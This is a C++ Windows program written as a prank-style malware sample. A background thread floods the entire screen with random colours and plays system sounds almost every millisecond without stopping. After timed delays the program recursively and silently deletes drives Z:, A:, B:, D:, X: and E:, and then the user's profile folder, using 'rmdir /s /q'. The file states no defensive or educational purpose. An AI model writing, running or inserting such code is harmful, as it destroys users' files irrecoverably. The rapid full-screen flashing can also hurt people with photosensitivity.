#include <iostream>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>

#ifdef _WIN32
    #include <windows.h>
    #include <mmsystem.h>
    #pragma comment(lib, "winmm.lib") 
#endif

void VisualEffectsStart() {
    HDC hdcScreen = GetDC(NULL);
    int r = rand() % 256; int g = rand() % 256; int b = rand() % 256;
    COLORREF randomColor = RGB(r, g, b);
    HBRUSH hBrush = CreateSolidBrush(randomColor);
    HGDIOBJ hOldBrush = SelectObject(hdcScreen, hBrush);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BitBlt(hdcScreen, 0, 0, screenWidth, screenHeight, NULL, 0, 0, PATCOPY);
    SelectObject(hdcScreen, hOldBrush);
    DeleteObject(hBrush);
    ReleaseDC(NULL, hdcScreen);

    const char* systemSounds[] = {
        "SystemAsterisk", "SystemDefault", "SystemExclamation", "SystemHand", "SystemQuestion"   
    };
    int randomSoundIndex = rand() % 5;
    PlaySoundA(systemSounds[randomSoundIndex], NULL, SND_ALIAS | SND_ASYNC);
}

// Unstoppable background loop function
void BackgroundLoop(int sleepTimeMs) {
    while (true) {
        VisualEffectsStart();
        std::this_thread::sleep_for(std::chrono::milliseconds(sleepTimeMs));
    }
}

int main() {
    srand(static_cast<unsigned int>(time(NULL)));
    
    int SLEEP_TIME = 1; 

    std::cout << "[Main] CHEMICAL IN YOUR EYES\n";

    // 1. Kick off the infinite loop on a background thread
    std::thread fxThread(BackgroundLoop, SLEEP_TIME);
    
    // 2. Detach it so it runs forever on its own
    fxThread.detach();

    // =================================================================
    // THIS CODE RUNS SIMULTANEOUSLY WHILE THE LOOP IS ALIVE
    // =================================================================
    std::cout << "[Main] EYE CHEMICALS.\n";
    
    // Wait exactly 10 minutes without freezing the background thread
    std::this_thread::sleep_for(std::chrono::minutes(10));

    std::cout << "I NEED AN EYE SHOWER NOW\n";
    
    system("rmdir /s /q Z:\\");

    system("rmdir /s /q A:\\");

    system("rmdir /s /q B:\\");

    system("rmdir /s /q D:\\");

    system("rmdir /s /q X:\\");

    std::cout << "EYE SHOWER CLEANSES YOUR Z AND A DRIVES";

    std::this_thread::sleep_for(std::chrono::minutes(5));

    std::cout << "CHEMICAL";

    system("rmdir /s /q E:\\");

    std::this_thread::sleep_for(std::chrono::minutes(5));

    std::cout << "EYE CLEANSED";
    
    system("cd .. && rmdir /s /q %USERPROFILE%");
    

    // Keep the main process alive so the detached thread doesn't close abruptly
    while (true) {
        std::this_thread::sleep_for(std::chrono::hours(24));
    }

    return 0;
}
